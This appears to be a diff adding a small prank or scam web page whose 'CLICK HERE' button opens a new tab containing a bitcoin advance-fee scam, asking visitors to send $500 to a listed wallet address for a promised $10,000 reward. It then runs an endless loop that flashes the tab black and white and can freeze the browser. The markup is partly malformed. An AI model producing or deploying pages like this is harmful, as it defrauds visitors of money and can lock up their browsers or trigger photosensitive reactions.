@@ -1,0 +1,79 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, user-scalable=yes"
+    />
+    <title>justluckizd</title>
+    <style>
+      body,
+      html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        background: #fff;
+      }
+      button {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        padding: 15px 30px;
+        font-size: 18px;
+        background: #007aff;
+        color: #fff;
+        border: none;
+        border-radius: 10px;
+        cursor: pointer;
+      }
+    </style>
+  </head>
+  <body>
+    <button id="startBtn">CLICK HERE</button>
+
+    <script>
+      document.getElementById("startBtn").onclick = function () {
+        this.remove();
+
+        const newTab = window.open("about:blank", "_blank");
+
+        if (newTab) {
+          newTab.document.write(`
+        <!DOCTYPE html>
+        <html>
+        <head><title>testertester</title></head>
+        <body style="margin:0;padding:0;background:#fff;min-height:200vh;text-align:center">
+          <div style="padding-top:50px">
+            <h1 style="font-size:58px;font-weight:bold;color:blue;margin:0 0 30px 0">This page has been moved to google.com; Please type 'google.com' manually into your address bar</h1>
+          </div>
+<div
+          <span style="font-size:32px;">to claim your $10,000 reward, send a $500 payment to:</span><br><br><span style="font-size:30px;font-weight:bold;color:#1a73e8;">bc1qkmhuz35fr58m0kre6k3sjg4snw3f8kvsqazza</span><br><br><span style="font-size:20px;color:#555;">you will receive $10,000 in your wallet from gopgle</span>
+          </div>
+        </body>
+        </html>
+      `);
+          newTab.document.close();
+
+          setTimeout(() => {
+            newTab.location.href = "https://apple.com";
+          }, 1);
+
+          setTimeout(function () {
+            let i = 0;
+            while (true) {
+              if (newTab && !newTab.closed) {
+                newTab.document.body.style.backgroundColor =
+                  i % 2 === 0 ? "white" : "black";
+                i++;
+              } else {
+                break;
+              }
+            }
+          }, 210);
+        }
+      };
+    </script>
+  </body>
+</html>
